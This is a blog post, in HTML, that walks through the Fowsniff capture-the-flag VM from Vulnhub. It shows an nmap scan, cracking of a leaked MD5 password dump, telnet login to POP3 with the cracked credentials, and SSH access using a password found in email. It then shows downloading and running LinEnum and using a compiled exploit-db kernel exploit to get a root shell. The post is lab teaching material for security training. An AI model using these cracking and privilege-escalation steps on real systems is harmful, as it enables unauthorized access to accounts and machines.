@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="DescriptionI created this boot2root last year to be hosted on Peerlyst.com. It’s beginner level, but requires more than just an exploitdb search or metasploit to run.It was created in (and is inten">
+<meta name="keywords" content="vulnhub,ctf,walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fowsniff Walkthrough">
+<meta property="og:url" content="https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/index.html">
+<meta property="og:site_name" content="InfoSec Adventures">
+<meta property="og:description" content="DescriptionI created this boot2root last year to be hosted on Peerlyst.com. It’s beginner level, but requires more than just an exploitdb search or metasploit to run.It was created in (and is inten">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/fowsniff_walkthrough.png">
+<meta property="og:updated_time" content="2019-05-01T23:00:51.395Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Fowsniff Walkthrough">
+<meta name="twitter:description" content="DescriptionI created this boot2root last year to be hosted on Peerlyst.com. It’s beginner level, but requires more than just an exploitdb search or metasploit to run.It was created in (and is inten">
+<meta name="twitter:image" content="https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/fowsniff_walkthrough.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+
+    <title>Fowsniff Walkthrough</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    
+    
+    
+      <link rel="alternate" href="/atom.xml" title="InfoSec Adventures" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/12/12/Nmap-Cheatsheet/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/11/28/The-Vernam-Cipher/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&text=Fowsniff Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&title=Fowsniff Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fowsniff Walkthrough&body=Check out this article: https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&title=Fowsniff Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-the-hashes"><span class="toc-number">1.2.</span> <span class="toc-text">Finding the hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-hashes"><span class="toc-number">1.3.</span> <span class="toc-text">Cracking the hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-mail-service"><span class="toc-number">1.4.</span> <span class="toc-text">The mail service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-the-emails"><span class="toc-number">1.5.</span> <span class="toc-text">Reading the emails</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-SSH-access"><span class="toc-number">1.6.</span> <span class="toc-text">Getting SSH access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.7.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.8.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.9.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Fowsniff Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">InfoSec Adventures</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-12-09T09:47:41.000Z" itemprop="datePublished">2018.12.09.</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Walkthroughs/">CTF Walkthroughs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/vulnhub/">vulnhub</a>, <a class="tag-link" href="/tags/walkthrough/">walkthrough</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script>
+
+<p><img src="fowsniff_walkthrough.png" alt></p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>I created this boot2root last year to be hosted on Peerlyst.com. It’s beginner level, but requires more than just an exploitdb search or metasploit to run.<br>It was created in (and is intended to be used with) VirtualBox, and takes some extra configuration to set up in VMWare.<br>Download it from here: <a href="https://www.vulnhub.com/entry/fowsniff-1,262/" target="_blank" rel="noopener">Fowsniff on Vulnhub</a></p>
+<h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The nmap port scan resulted in the following output:</p>
+<pre><code>root@kali:~/Downloads# nmap -A -sC -p- 192.168.43.90
+Nmap scan report for fowsniff (192.168.43.90)
+Host is up (0.00052s latency).
+Not shown: 65531 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
+|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
+|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+| http-server-header: Apache/2.4.18 (Ubuntu)
+| http-title: Fowsniff Corp - Delivering Solutions
+110/tcp open  pop3    Dovecot pop3d
+| pop3-capabilities: CAPA RESP-CODES USER TOP SASL(PLAIN) PIPELINING AUTH-RESP-CODE UIDL
+143/tcp open  imap    Dovecot imapd
+| imap-capabilities: capabilities IMAP4rev1 listed more LOGIN-REFERRALS OK
+have ENABLE post-login ID SASL-IR IDLE Pre-login AUTH=PLAINA0001 LITERAL+
+MAC Address: 08:00:27:66:85:17 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms fowsniff (192.168.43.90)
+</code></pre><p>First of all, I went to examine the web server. It was a single page with a notification that the website is out of service, because the corporation has been hacked.</p>
+<blockquote>
+<p>The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.</p>
+</blockquote>
+<h2 id="Finding-the-hashes"><a href="#Finding-the-hashes" class="headerlink" title="Finding the hashes"></a>Finding the hashes</h2><p>A quick search on Twitter revealed the hacked Fowsniff account. One of the tweets contained a pastebin link to the dumped hashes. Here is what the file contained:</p>
+<pre><code>FOWSNIFF CORP PASSWORD LEAK
+            &apos;&apos;~``
+           ( o o )
++-----.oooO--(_)--Oooo.------+
+|                            |
+|          FOWSNIFF          |
+|            got             |
+|           PWN3D!!!         |
+|                            |         
+|       .oooO                |         
+|        (   )   Oooo.       |         
++---------\ (----(   )-------+
+           \_)    ) /
+                 (_/
+FowSniff Corp got pwn3d by B1gN1nj4!
+No one is safe from my 1337 skillz!
+
+
+mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+
+Fowsniff Corporation Passwords LEAKED!
+FOWSNIFF CORP PASSWORD DUMP!
+
+Here are their email passwords dumped from their databases.
+They left their pop3 server WIDE OPEN, too!
+
+MD5 is insecure, so you shouldn&apos;t have trouble cracking them but I was too lazy haha =P
+
+l8r n00bz!
+
+B1gN1nj4
+</code></pre><h2 id="Cracking-the-hashes"><a href="#Cracking-the-hashes" class="headerlink" title="Cracking the hashes"></a>Cracking the hashes</h2><p>I copied the MD5 hashes to a separate file and used john to crack them, but it was only able to crack 6 of them.</p>
+<pre><code>root@kali:~/Downloads# john --format=RAW-MD5 dump.txt
+Using default input encoding: UTF-8
+Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+scoobydoo2       (seina@fowsniff)
+apples01         (tegel@fowsniff)
+bilbo101         (mustikka@fowsniff)
+skyler22         (baksteen@fowsniff)
+07011972         (sciana@fowsniff)
+mailcall         (mauer@fowsniff)
+</code></pre><p>I thought, I should try an online cracker like hashkiller.co.uk. The result was a little better, only one password is missing, but that’s fine for me.</p>
+<pre><code>8a28a94a588a95b80163709ab4313aa4 MD5 : mailcall
+ae1644dac5b77c0cf51e0d26ad6d7e56 MD5 : bilbo101
+1dc352435fecca338acfd4be10984009 MD5 : apples01
+19f5af754c31f1e2651edde9250d69bb MD5 : skyler22
+90dc16d47114aa13671c697fd506cf26 MD5 : scoobydoo2
+a92b8a29ef1183192e3d35187e0cfabd [Not found]
+0e9588cb62f4b6f27e33d449e2ba0b3b MD5 : carp4ever
+4d6e42f56e127803285a0a7649b5ab11 MD5 : orlando12
+f7fd98d380735e859f8b2ffbbede5a7e MD5 : 07011972
+</code></pre><h2 id="The-mail-service"><a href="#The-mail-service" class="headerlink" title="The mail service"></a>The mail service</h2><p>It was time to make use of these credentials and log in. I telnetted into the machine on port 110, which is the pop3 service. I could have used a metasploit module, but I was willing to try all of them manually. I got lucky with user <code>seina</code>.</p>
+<pre><code>root@kali:~# telnet 192.168.43.90 110
+Trying 192.168.43.90...
+Connected to 192.168.43.90.
+Escape character is &apos;^]&apos;.
++OK Welcome to the Fowsniff Corporate Mail Server!
+USER seina
++OK
+PASS scoobydoo2
++OK Logged in.
+list
++OK 2 messages:
+1 1622
+2 1280
+</code></pre><p>As it turns out, the account has 2 messages, so let’s read them.</p>
+<h2 id="Reading-the-emails"><a href="#Reading-the-emails" class="headerlink" title="Reading the emails"></a>Reading the emails</h2><p>Here is the first one:</p>
+<pre><code>retr 1
++OK 1622 octets
+Return-Path: &lt;stone@fowsniff&gt;
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+    id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are &quot;in the shop,&quot; we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via
+the SSH protocol.
+
+The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we&apos;ll set it up.
+
+Thanks,
+A.J Stone
+</code></pre><p>Okay… At this point I knew a temporary SSH password, but I didn’t know who changed their password it already. The second message came to my rescue and revealed the sloppy user.</p>
+<pre><code>retr 2
++OK 1280 octets
+Return-Path: &lt;baksteen@fowsniff&gt;
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1004)
+    id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+To: seina@fowsniff
+Subject: You missed out!
+Message-Id: &lt;20180313185405.101CA1AC2@fowsniff&gt;
+Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+From: baksteen@fowsniff
+
+Devin,
+
+You should have seen the brass lay into AJ today!
+We are going to be talking about this one for a looooong time hahaha.
+Who knew the regional manager had been in the navy? She was swearing like a sailor!
+
+I don&apos;t know what kind of pneumonia or something you brought back with
+you from your camping trip, but I think I&apos;m coming down with it myself.
+How long have you been gone - a week?
+Next time you&apos;re going to get sick and miss the managerial blowout of the century,
+at least keep it to yourself!
+
+I&apos;m going to head home early and eat some chicken soup.
+I think I just got an email from Stone, too, but it&apos;s probably just some
+&quot;Let me explain the tone of my meeting with management&quot; face-saving mail.
+I&apos;ll read it when I get back.
+
+Feel better,
+
+Skyler
+
+PS: Make sure you change your email password.
+AJ had been telling us to do that right before Captain Profanity showed up.
+</code></pre><p>This message came from <code>baksteen</code> and know I know, he didn’t have the time to change his SSH password.</p>
+<h2 id="Getting-SSH-access"><a href="#Getting-SSH-access" class="headerlink" title="Getting SSH access"></a>Getting SSH access</h2><pre><code>root@kali:~# ssh baksteen@192.168.43.90
+baksteen@192.168.43.90&apos;s password:
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &apos;_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| &apos;__| &apos;_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_)
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! ****
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+baksteen@fowsniff:~$
+</code></pre><p>I quickly looked around, but I didn’t find anything useful.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>As for enumeration, my favorite bash script is LinEnum. You can download it from here: <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a><br>The output of this script is pretty long, so I just show the important parts.</p>
+<pre><code>baksteen@fowsniff:/tmp$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2018-12-09 08:20:53--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133, 64:ff9b::9765:7085
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 47585 (46K) [text/plain]
+Saving to: â€˜LinEnum.shâ€™
+
+LinEnum.sh                100%[===================================&gt;]  46.47K  --.-KB/s    in 0.08s   
+
+2018-12-09 08:20:53 (605 KB/s) - &quot;LinEnum.sh&quot; saved [47585/47585]
+
+baksteen@fowsniff:/tmp$ chmod +x LinEnum.sh
+baksteen@fowsniff:/tmp$ ./LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration &amp; Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.93
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+[-] Kernel information (continued):
+Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609
+  (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.4 LTS&quot;
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;16.04.4 LTS (Xenial Xerus)&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 16.04.4 LTS&quot;
+VERSION_ID=&quot;16.04&quot;
+HOME_URL=&quot;http://www.ubuntu.com/&quot;
+SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
+BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+</code></pre><div class="addthis_tipjar_inline"></div>
+
+<h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>I didn’t find anything unusual that’s why I went on to check the kernel version and search for some exploits. It didn’t take long to find the correct exploit.<br>Link: <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44298</a><br>The target machine didn’t have gcc installed, so I compiled the source code on my Kali machine and then transferred the binary to the target machine’s <code>tmp</code> folder.</p>
+<pre><code>root@kali:~/Downloads# gcc exploit.c -o exploit
+root@kali:~/Downloads# scp exploit baksteen@192.168.43.90:/tmp
+baksteen@192.168.43.90&apos;s password:
+exploit
+</code></pre><p>On the target machine, I executed the exploit…</p>
+<pre><code>baksteen@fowsniff:/tmp$ ./exploit
+task_struct = ffff88001c045400
+uidptr = ffff88001f266d84
+spawning root shell
+root@fowsniff:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
+</code></pre><p>and I got a root shell. Yaay!</p>
+<p>The only thing left is printing the flag:</p>
+<pre><code>    ___                        _        _      _   _             _
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ &apos; \/ _` | &apos;_/ _` |  _| || | / _` |  _| / _ \ &apos; \(_-&lt;_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/
+
+ (_)
+  |--------------
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |    R O O T   |
+  |    F L A G   |
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedbacks and donations are always welcome!</p>
+<p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-the-hashes"><span class="toc-number">1.2.</span> <span class="toc-text">Finding the hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-hashes"><span class="toc-number">1.3.</span> <span class="toc-text">Cracking the hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-mail-service"><span class="toc-number">1.4.</span> <span class="toc-text">The mail service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-the-emails"><span class="toc-number">1.5.</span> <span class="toc-text">Reading the emails</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-SSH-access"><span class="toc-number">1.6.</span> <span class="toc-text">Getting SSH access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.7.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.8.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.9.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&text=Fowsniff Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&title=Fowsniff Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fowsniff Walkthrough&body=Check out this article: https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/12/09/Fowsniff-Walkthrough/&title=Fowsniff Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <!--<a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>-->
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kristof Toth
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131012780-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'infosecadventures';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
